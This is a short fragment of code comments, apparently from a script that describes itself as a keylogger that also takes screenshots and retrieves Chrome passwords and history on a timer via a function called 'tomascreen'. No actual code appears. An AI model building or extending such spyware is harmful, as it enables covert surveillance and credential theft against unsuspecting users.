#THIS IS THE MAIN SCRIPT THAT GENERATES THE KEYLOGGER, TAKES SCREEN SHOTS RETRIEVES THE PASSWORD AND HISTORY FROM CHROME 
...
#LA FUNCION tomascreen ES LA ENCARGADA DE MANAR LLAMAR LAS OTRAS FUNCIONES EN BASE AL TIEMPO INGRESADO
